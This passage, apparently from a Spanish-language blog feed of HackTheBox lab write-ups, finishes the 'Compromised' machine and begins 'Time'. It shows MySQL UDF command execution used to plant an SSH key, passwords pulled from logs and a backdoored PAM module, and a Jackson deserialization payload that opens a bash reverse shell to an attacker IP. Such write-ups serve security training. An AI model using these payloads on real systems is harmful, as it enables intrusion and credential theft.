daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
sysadmin:x:1000:1000:compromise:/home/sysadmin:/bin/bash
mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash
red:x:1001:1001::/home/red:/bin/false
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como el usuario &lt;code&gt;mysql&lt;/code&gt; tiene una bash podria estar relacionado a los &lt;code&gt;UDF&lt;/code&gt;, que nos permiten definir funciones especificas.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;UDF: una Función Definida por el Usuario (UDF) es un trozo de código que extiende la funcionalidad de un servidor MySQL añadiendo una nueva función que se comporta igual que una función nativa (incorporada) de MySQL, como abs() o concat().&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Para poder listar estas funciones, haciendo uso de la mismas credenciales de la base de datos, podemos hacerlo ejecutando:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql -uroot -pchangethis -e &quot;select * from mysql.func&quot;
&amp;lt;l -uroot -pchangethis -e &quot;select * from mysql.func&quot;
mysql: [Warning] Using a password on the command line interface can be insecure.
+----------+-----+-------------+----------+
| name     | ret | dl          | type     |
+----------+-----+-------------+----------+
| exec_cmd |   0 | libmysql.so | function |
+----------+-----+-------------+----------+
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;vemos que existe una función definida de nombre &lt;code&gt;exec_cmd&lt;/code&gt;, que al ejecutar un comando nos lo realiza exitosamente.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql -uroot -pchangethis -e &quot;select exec_cmd('pwd');&quot;
&amp;lt;ql -uroot -pchangethis -e &quot;select exec_cmd('pwd');&quot;
mysql: [Warning] Using a password on the command line interface can be insecure.

| exec_cmd('pwd')                                                                                                                                                                                                                                                                                                     |

| /var/lib/mysql
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No podemos entablarnos una reverse shell, pero recordemos que el puerto &lt;code&gt;22&lt;/code&gt; esta abierto, asi que podriamos usar los principios basicos de claves ssh, para introducir nuestra clave publica en el directorio del usuario como &lt;code&gt;authorized_keys&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Creamos el directorio &lt;code&gt;.ssh&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql -uroot -pchangethis -e &quot;select exec_cmd('mkdir /var/lib/mysql/.ssh/');&quot;
&amp;lt;-e &quot;select exec_cmd('mkdir /var/lib/mysql/.ssh/');&quot;
mysql: [Warning] Using a password on the command line interface can be insecure.

| exec_cmd('mkdir /var/lib/mysql/.ssh/')                                 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Introducimos nuestra clave privada, renombrandola como &lt;code&gt;authorized_keys&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql -uroot -pchangethis -e &quot;select exec_cmd('echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSSuSh/zi5KspA8ZYqWIxduahcDanjzfout7+OVdf5zD6rme/9U0gKI5qKUV+aPk2KwyRK0se06hdubAKQJ0xNciuPoOMSiN8UqbikaxxUNNq2wUBdzGEQ93gFzpHD1VJ+LHGyJJO82x/awHBT9d7m1lgqPxuIPKC/CZWMR/8CLuC649eSaoJ5HaxeMDHNNmKu511aZUxCetjVhQxRdI3unUz7h+Bg0x64v9HYC1oOcilMJAdOXNsIJLDpeDajnz/bYjVjqx1fe4ztyhneoMF1/h4xc0165Vb2YT5AezAOuY+yZlRjkKlYuuvxGulZ1P72Pc1hO/4p3/waHz53JwfrlKtGzo0Vq2H+ajXXmNKhPbv5g531F0j75DYTMXs/oQFntvcqxXQCqqBmKsY0Gf4yy3M5D/KNOW4Z8Naeauu+XFHfqd/jTzaXck24XFYfZj1VAdn7XqD30Q3QIhESWj5i3n9E7kohx5PhgU7OB5u6K4YPVXjjOQ30iwWGQcnYAeU= root@hack4u &amp;gt; /var/lib/mysql/.ssh/authorized_keys');&quot;
&amp;lt;ot@hack4u &amp;gt; /var/lib/mysql/.ssh/authorized_keys');&quot;
mysql: [Warning] Using a password on the command line interface can be insecure.
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ssh mysql@10.10.10.207
Last login: Thu Sep  3 11:52:44 2020 from 10.10.14.2
mysql@compromised:~$ whoami
mysql
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez dentro como el usuario &lt;code&gt;mysql&lt;/code&gt;, vamos a buscar de manera recursiva por la palabra &lt;code&gt;sysadmin&lt;/code&gt;, encontramos un archivo &lt;code&gt;lib/mysql/strace-log.dat&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mysql@compromised:/var$ grep -ri &quot;sysadmin&quot; 2&amp;gt;/dev/null
log/cloud-init.log:2020-05-08 15:50:07,874 - __init__.py[DEBUG]: Adding user sysadmin
log/cloud-init.log:2020-05-08 15:50:07,874 - util.py[DEBUG]: Running hidden command to protect sensitive input/output logstring: ['useradd', 'sysadmin', '--comment', 'compromise', '--groups', 'adm,cdrom,dip,plugdev,lxd,sudo', '--password', 'REDACTED', '--shell', '/bin/bash', '-m']
log/cloud-init.log:2020-05-08 15:50:31,366 - cc_ssh_import_id.py[DEBUG]: User sysadmin is not configured for ssh_import_id
log/cloud-init-output.log:ci-info: no authorized SSH keys fingerprints found for user sysadmin.
log/installer/subiquity-debug.log.2150:2020-05-08 15:33:28,872 DEBUG subiquity.controllers.identity:73 IdentityController.done next_screen user_spec={'hostname': 'compromise', 'realname': 'compromise', 'username': 'sysadmin', 'password': '&amp;lt;REDACTED&amp;gt;'}
lib/dpkg/info/systemd.postinst:# runtime-dir/sysadmin-dir/other packages (e.g. rsyslog)
lib/dpkg/info/dash.postinst:		# The sysadmin wants it this way.  Who am I to argue?
lib/dpkg/info/libssl1.0.0:amd64.postinst:	# update for a security issue, but planned by the sysadmin, not
lib/dpkg/info/libssl1.1:amd64.postinst:	# update for a security issue, but planned by the sysadmin, not
lib/dpkg/info/irqbalance.postinst:    # things the local sysadmin has added to the old /etc/default/irqbalance
lib/dpkg/info/irqbalance.postinst:        # Insert a header to help sysadmin figure out why these things are here.
lib/dpkg/info/irqbalance.postinst:        # been added to the file by the local sysadmin.
lib/dpkg/status: Sudo is a program designed to allow a sysadmin to give limited root
lib/dpkg/status: You should install ltrace if you need a sysadmin tool for tracking the
lib/dpkg/status: common Linux/UNIX commands, reducing the amount of typing sysadmins
lib/dpkg/status-old: Sudo is a program designed to allow a sysadmin to give limited root
lib/dpkg/status-old: You should install ltrace if you need a sysadmin tool for tracking the
lib/dpkg/status-old: common Linux/UNIX commands, reducing the amount of typing sysadmins
lib/mysql/strace-log.dat:22102 03:10:59 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
lib/mysql/strace-log.dat:22102 03:11:00 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
lib/mysql/strace-log.dat:22102 03:11:03 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
lib/mysql/strace-log.dat:22227 03:11:09 stat(&quot;/home/sysadmin/.my.cnf&quot;, 0x7fff97cc5590) = -1 ENOENT (No such file or directory)
lib/mysql/strace-log.dat:22227 03:11:09 stat(&quot;/home/sysadmin/.mylogin.cnf&quot;, 0x7fff97cc5590) = -1 ENOENT (No such file or directory)
lib/mysql/strace-log.dat:22102 03:11:09 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
lib/mysql/strace-log.dat:22228 03:11:15 stat(&quot;/home/sysadmin/.my.cnf&quot;, 0x7ffdc5cfb790) = -1 ENOENT (No such file or directory)
lib/mysql/strace-log.dat:22228 03:11:15 stat(&quot;/home/sysadmin/.mylogin.cnf&quot;, 0x7ffdc5cfb790) = -1 ENOENT (No such file or directory)
lib/mysql/strace-log.dat:22102 03:11:15 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
lib/mysql/strace-log.dat:22229 03:11:18 stat(&quot;/home/sysadmin/.my.cnf&quot;, 0x7ffcd3f055a0) = -1 ENOENT (No such file or directory)
lib/mysql/strace-log.dat:22229 03:11:18 stat(&quot;/home/sysadmin/.mylogin.cnf&quot;, 0x7ffcd3f055a0) = -1 ENOENT (No such file or directory)
lib/mysql/strace-log.dat:22229 03:11:18 readlink(&quot;/home/sysadmin/.mysql_history&quot;, 0x7ffcd3f0a390, 511) = -1 ENOENT (No such file or directory)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Leemos el archivo y filtramos por &lt;code&gt;sysadmin y password&lt;/code&gt;, para tratar de encontrar credenciales en texto claro.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mysql@compromised:/var$ cat lib/mysql/strace-log.dat | grep -iE &quot;sysadmin|password&quot;
22102 03:10:59 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
22102 03:11:00 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
22102 03:11:03 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
22102 03:11:06 write(2, &quot;mysql -u root --password='3*NLJE&quot;..., 39) = 39
22227 03:11:09 execve(&quot;/usr/bin/mysql&quot;, [&quot;mysql&quot;, &quot;-u&quot;, &quot;root&quot;, &quot;--password=3*NLJE32I$Fe&quot;], 0x55bc62467900 /* 21 vars */) = 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Encontramos una credencial que si la validamos corresponde al usuario &lt;code&gt;sysadmin&lt;/code&gt;, ahora podemos ir a su directorio personal y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mysql@compromised:/var$ su sysadmin
Password: 
sysadmin@compromised:/var$ whoami
sysadmin
sysadmin@compromised:/var$ cd /home/sysadmin/
sysadmin@compromised:~$ cat user.txt 
e0915cc0811946d4d341100789b6592e
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Como la maquina se llama &lt;code&gt;compromised&lt;/code&gt;, nos da una pista de que la maquina previamente ya fue comprometida, por lo tanto puedo pensar que para garantia de una escalada de privilegios se pudo dejar un &lt;code&gt;rootkit&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Rootkit: Un rootkit es un tipo de software malicioso diseñado para dar la capacidad de introducirse en un dispositivo y hacerse con el control del mismo. Por lo general, los rootkits afectan el software o el sistema operativo del dispositivo que infectan, pero algunos pueden actuar sobre su hardware o firmware. Los rootkits operan en segundo plano, sin dar muestras de que están activos.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Para poder detectarlo vamos a usar &lt;code&gt;linpeas.sh&lt;/code&gt; del repositorio de &lt;code&gt;carlospolop&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/carlospolop/PEASS-ng/releases/tag/20230611-b11e87f7&quot;&gt;https://github.com/carlospolop/PEASS-ng/releases/tag/20230611-b11e87f7&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ejecutamos el &lt;code&gt;linpeas&lt;/code&gt; y encontramos que &lt;code&gt;.pam_unix.so&lt;/code&gt; se encuentra oculto.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;pam_unix.so: Este es el módulo estándar de autenticación de Unix. Utiliza llamadas estándar de las bibliotecas del sistema para recuperar y establecer la información de la cuenta, así como la autenticación. Usualmente esto se obtiene del archivo /etc/passwd y del archivo /etc/shadow también si shadow está habilitado.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Como vemos el &lt;code&gt;pam_unix&lt;/code&gt; toca temas de autenticación, vamos a traernoslo a nuestro equipo y analizarlo. Para ello vamos a hacer un bae64 del archivo y decodearlo en nuestro equipo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sysadmin@compromised:/lib/x86_64-linux-gnu/security$ base64 -w 0 .pam_unix.so; echo
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez tengamos el archivo en nuestro equipo vamos a examinarlo con &lt;code&gt;radare2&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ file pam_unix.so
pam_unix.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=52d069272a0900ed4963258eab93237d38c6d1c4, with debug_info, not stripped
❯ radare2 pam_unix.so
Warning: run r2 with -e bin.cache=true to fix relocations in disassembly
 -- Select your architecture with: 'e asm.arch=&amp;lt;arch&amp;gt;' or r2 -a from the shell
[0x000025c0]&amp;gt; aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze all functions arguments/locals
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information (aanr)
[x] Integrate dwarf function information.
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x000025c0]&amp;gt; afl
0x000025c0    4 50   -&amp;gt; 40   entry0
0x00002c70   28 732  -&amp;gt; 681  dbg.pam_sm_acct_mgmt
0x00002f70   34 670  -&amp;gt; 633  dbg.pam_sm_authenticate
0x00004390   13 222  -&amp;gt; 210  dbg.pam_sm_close_session
0x00003210    6 116          dbg.pam_sm_setcred
0x00003750  104 2863 -&amp;gt; 2805 dbg.pam_sm_chauthtok
0x00004280   13 262  -&amp;gt; 256  dbg.pam_sm_open_session
[0x000025c0]&amp;gt; s dbg.pam_sm_authenticate
[0x00002f70]&amp;gt; pdf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Analizando vemos una intrucción que hace referencia a &lt;code&gt;pam_unix_auth.c&lt;/code&gt;, con lo que parece ser una credencial, en dos partes similar al formato de una credencial que previamente obtuvimos &lt;code&gt;zlke~U3Env82m2-&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Validamos y efectivamente la credencial corresponde al usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sysadmin@compromised:/lib/x86_64-linux-gnu/security$ su root
Password: 
root@compromised:/lib/x86_64-linux-gnu/security# whoami
root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo que nos queda por hacer es dirigirnos al directorio personal del usuario &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@compromised:/lib/x86_64-linux-gnu/security# cd /root/
root@compromised:~# cat root.txt 
e62293eadbdb5c168b024782d6943394
&lt;/code&gt;&lt;/pre&gt;
</description>
        <pubDate>Tue, 13 Jun 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Compromissed</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Compromissed</guid>
        
        <category>Information leaked</category>
        
        <category>bypass disable functions php</category>
        
        <category>litecart exploit</category>
        
        <category>tty interactive</category>
        
        <category>enumeration sql</category>
        
        <category>UDF</category>
        
        <category>log filter</category>
        
        <category>rootkit</category>
        
        <category>linpeas</category>
        
        <category>pamunix</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Time - htb writeup</title>
        <description>&lt;p&gt;Hoy vamos a resolver la máquina &lt;code&gt;Time&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una &lt;code&gt;linux&lt;/code&gt; dificultad media, la cual va a ser explotada utilizando la vulnerabilidad de &lt;code&gt;Jackson CVE-2019-12384&lt;/code&gt;, y aprovecharemos la vulnerabilidad &lt;code&gt;SSRF&lt;/code&gt; derivandola en una ejecucion remota de comandos &lt;code&gt;RCE&lt;/code&gt; que nos dara acceso al sistema, para que finalmente aprovechandonos de una tarea &lt;code&gt;Cron&lt;/code&gt; podamos obtener acceso como el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Time
❯ ls
 Time
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.214
PING 10.10.10.214 (10.10.10.214) 56(84) bytes of data.
64 bytes from 10.10.10.214: icmp_seq=1 ttl=63 time=133 ms

--- 10.10.10.214 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 133.374/133.374/133.374/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;allPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.214 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-12 20:48 GMT
Initiating SYN Stealth Scan at 20:48
Scanning 10.10.10.214 [65535 ports]
Discovered open port 80/tcp on 10.10.10.214
Discovered open port 22/tcp on 10.10.10.214
Completed SYN Stealth Scan at 20:49, 17.83s elapsed (65535 total ports)
Nmap scan report for 10.10.10.214
Host is up, received user-set (0.15s latency).
Scanned at 2023-06-12 20:48:51 GMT for 18s
Not shown: 65476 closed tcp ports (reset), 57 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.97 seconds
           Raw packets sent: 87623 (3.855MB) | Rcvd: 86271 (3.451MB)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Podemos ver que los puertos que se encuentran abiertos son el puerto &lt;code&gt;22 ssh&lt;/code&gt; y el &lt;code&gt;80 http&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80 10.10.10.214 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-12 20:49 GMT
Nmap scan report for 10.10.10.214
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA)
|   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA)
|_  256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Online JSON parser
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.90 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 8.2p1 Ubuntu 4ubuntu0.1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.41&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Seguidamente vamos a usar la herramienta &lt;code&gt;whatweb&lt;/code&gt; para ver por consola el gestor de contenido de la pagina web.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ whatweb http://10.10.10.214
http://10.10.10.214 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.214], JQuery[3.2.1], Script, Title[Online JSON parser]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La herramienta nos reporta que se trata de un &lt;code&gt;JSON parser&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Vamos a abrir la web y vemos que la pagina efectivamente es un &lt;code&gt;JSON parser&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Time/time1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos una opcion de &lt;code&gt;Beautify&lt;/code&gt; que al pasarle datos en &lt;code&gt;JSON&lt;/code&gt; nos lo muestra de manera mas estetica.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Time/time2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dentro de las opciones tambien podemos ver una de &lt;code&gt;Validate (Beta)&lt;/code&gt;,y si procesamos una comilla nos arroja un error referente a &lt;code&gt;jackson java&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Time/time4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Investigando un poco encontramos que existe una vulnerabilidad a una libreria &lt;code&gt;jackson&lt;/code&gt; que se usa para la deserealizacion &lt;code&gt;JSON&lt;/code&gt; y mediante ello podemos realizar ataques de &lt;code&gt;SSRF&lt;/code&gt; y derivarlo a una ejecucion remota de comandos.&lt;/p&gt;

&lt;p&gt;Si deseas entender a mayor detalle la vulnerabilidad te dejo el siguiente articulo:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.doyensec.com/2019/07/22/jackson-gadgets.html&quot;&gt;https://blog.doyensec.com/2019/07/22/jackson-gadgets.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para explotar esta vulnerabilidad debemos crear un archivo &lt;code&gt;inject.sql&lt;/code&gt; con el siguiente contenido:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
	String[] command = {&quot;bash&quot;, &quot;-c&quot;, cmd};
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(&quot;\\A&quot;);
	return s.hasNext() ? s.next() : &quot;&quot;;  }
$$;
CALL SHELLEXEC('bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.3/443 0&amp;gt;&amp;amp;1')
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;En la función &lt;code&gt;shellexec&lt;/code&gt;, introducimos el codigo que queremos que se ejecute cuando suceda la desearialización. En este caso introduciremos una instrucción en &lt;code&gt;bash&lt;/code&gt; que nos permita obtener una reverse shell.&lt;/p&gt;

&lt;p&gt;Lo siguiente ejecutar lo siguiente instrucción en el &lt;code&gt;JSON PARSER&lt;/code&gt;, donde especificaremos nuestra ip, donde nos compartiremos el archivo &lt;code&gt;inject.sql&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Time/time5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora nos compartimos el archivo, usando python.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ python3 -m http.server 80
